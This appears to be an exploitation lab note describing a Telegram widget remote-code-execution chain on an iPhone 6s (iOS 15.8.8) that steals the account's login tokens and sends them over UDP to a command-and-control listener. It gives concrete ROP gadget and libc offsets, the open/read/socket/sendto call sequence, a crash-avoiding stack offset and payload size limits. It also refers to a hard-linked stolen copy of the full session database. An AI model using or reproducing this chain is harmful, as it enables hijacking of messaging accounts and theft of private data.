# iOS 6s — session exfil to a dedicated C2 (2026-11-05)

Target: iPhone 6s, iOS 15.8.8, Telegram 13.2 (36535), widget `message-widget`.
Result: the widget RCE reads `accounts-metadata/login-tokens` and sends it to a
**separate UDP C2** (`<LAN_IP>:4450`); no shell needed.

## C2 receiver

`/tmp/opencode/c2_udp_4450.py` — UDP socket bound to `0.0.0.0:4450`.
One datagram, saved to `/tmp/opencode/ios_login_tokens.bin`.

Observed:
```
GOT 1024 from ('<LAN_IP>', 53680)
HEAD ["Ur3u...","Gr3u...","deBb...","vwIP...","WPUO...","V3YN...","R3YN...","vGpk...","Nj5z..."]
```
The first 244 bytes are the JSON login-token array of the account; the rest is
the 1024-byte read buffer padding (zeros).

## Chain (payload `lab/ios_port/ios_exfil_udp_endgame.js`)

- Same [1827] primitive, per-run random magic, leak of a fresh
  `Uint8Array(4096)` data pointer, data/structs in that large block.
- Pivot `JavaScriptCore+0x3a0ee8` `mov sp,x0; ret` (`libcFree - 0x66cccfc`).
- Gadgets `G_CALL 0x3292c`, `G_LOAD 0x172d96c`, `G_X0 0x628a2c`.
- Calls (deltas from libc `free`, iOS 15.8.8):
  - `open`  `+0x296b394c`
  - `read`  `+0x296b2d60`
  - `socket` `+0x296b8d8c`
  - `sendto` `+0x296b62fc`
  - `pthread_exit` `+0x4a21a474`
- Sequence: `open(login-tokens)` -> `read(fd, U+0x200, 1024)` ->
  `socket(AF_INET, SOCK_DGRAM, 0)` -> `sendto(fd, U+0x200, 1024, 0,
  sockaddr(<LAN_IP>:4450), 16)` -> `pthread_exit(0)`.
- Critical offset: after the `read` call, the `G_CALL` epilogue loads x20 from
  `SP+0x90` (U+0x258), not U+0x260; a wrong offset crashes in `G_LOAD` at
  `[x20+0x10]` with x20=0.
- Payload size: 8,865 B raw / 3,937 B zlib9 (under the 4 KiB widget limit).
- `pthread_exit` kills the widget thread; relaunch Telegram before another
  widget payload.

## Full session DB

The 47 MB Postbox DB remains available via the hard link
`Documents/stolen_db` (see `ios_session_stealer_6s.md`); the UDP C2 gets the
small login-token file, which is the account's session credential set.
